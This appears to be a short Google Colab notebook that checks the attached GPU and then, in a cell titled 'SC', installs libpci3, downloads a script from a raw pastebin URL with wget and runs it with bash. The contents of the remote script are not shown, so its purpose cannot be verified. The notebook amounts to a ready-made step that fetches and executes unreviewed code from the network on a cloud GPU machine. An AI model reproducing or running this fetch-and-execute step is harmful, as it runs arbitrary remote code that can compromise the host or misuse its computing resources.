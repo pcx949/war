{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "CC.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyNhEUGQwgaQj37RhexB81KF"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SiLOrToq8X9V",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1648327524874,
          "user_tz": -420,
          "elapsed": 6,
          "user": {
            "displayName": "nul",
            "photoUrl": "https://lh3.googleusercontent.com/a-/AOh14GirJMqfhxy7hRI9D__Kz2rmo-WIVpnDG0epHB43qBI=s64",
            "userId": "03711127726558806304"
          }
        },
        "outputId": "b4899b73-ea5a-45ce-b6b6-ba226089be7c"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "GPU 0: Tesla K80 (UUID: GPU-c8b5aaab-3895-ad92-f2f4-cdf61deda3ef)\n"
          ]
        }
      ],
      "source": [
        "#@title **CEK-IN**\n",
        "!nvidia-smi -L"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#@title **SC**\n",
        "\n",
        "\n",
        "!apt-get update \n",
        "!apt-get install libpci3\n",
        "!wget https://pastebin.com/raw/qXRXqHbu\n",
        "!bash qXRXqHbu"
      ],
      "metadata": {
        "id": "zXAfsz7Q_Sii"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
